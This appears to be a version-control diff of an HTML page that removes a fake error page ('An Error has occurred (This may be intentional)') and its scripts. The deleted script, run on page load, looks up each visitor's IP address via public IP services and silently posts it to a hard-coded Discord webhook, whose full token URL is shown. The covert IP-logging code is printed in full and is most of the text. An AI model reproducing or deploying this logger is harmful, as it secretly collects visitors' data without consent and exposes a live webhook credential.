@@ -13,95 +13,12 @@
 </head>
 <body  style="background-color:powderblue;">
 
-<h1>An Error has occurred (This may be intentional)</h1>
+<h1>temp</h1>
 
-<p>Error ID:23</p>
+<p>done</p>
 
 </body>
-<script>
-var response
 
-fetch("http://api.hostip.info/")
-.then(d=>d.json())
-.then(obj=>send(obj.ip))
-  
-    
-	
-const request = new XMLHttpRequest();
-request.open("POST", "https://discord.com/api/webhooks/932894655337619486/EY1j_EiHomlAev06UTMSEnvdLvnwEG4ZZaZxS8vOSjpzqae1KQSitx-PCGbrEk41oxY_");
-
-request.setRequestHeader('Content-type', 'application/json');
-    
-	
-	
-function send (data){
-    
-	console.log(response + "r")
-	
-	const params = {
-		username: "test",
-		avatar_url: "",
-		content: (data)
-	}
-
-	console.log(data)
-	
-	request.send(JSON.stringify(params));
-  
-	console.log(params);
-    
-	
-	console.log("done")
-}
-
-</script>
-  
-  
-</body>
-</html>
-<html>
-<head>
-<meta http-equiv="content-type" content="text/html; charset=UTF-8">
-</head>
-<body>
-
-<script>
-var response
-
-fetch("https://api.ipify.org/?format=json")
-.then(d=>d.json())
-.then(obj=>send(obj.ip))
-  
-    
-	
-const request = new XMLHttpRequest();
-request.open("POST", "https://discord.com/api/webhooks/932894655337619486/EY1j_EiHomlAev06UTMSEnvdLvnwEG4ZZaZxS8vOSjpzqae1KQSitx-PCGbrEk41oxY_");
-
-request.setRequestHeader('Content-type', 'application/json');
-    
-	
-	
-function send (data){
-    
-	console.log(response + "r")
-	
-	const params = {
-		username: "test",
-		avatar_url: "",
-		content: (data)
-	}
-
-	console.log(data)
-	
-	request.send(JSON.stringify(params));
-  
-	console.log(params);
-    
-	
-	console.log("done")
-}
-
-</script>
   
   
 </body>
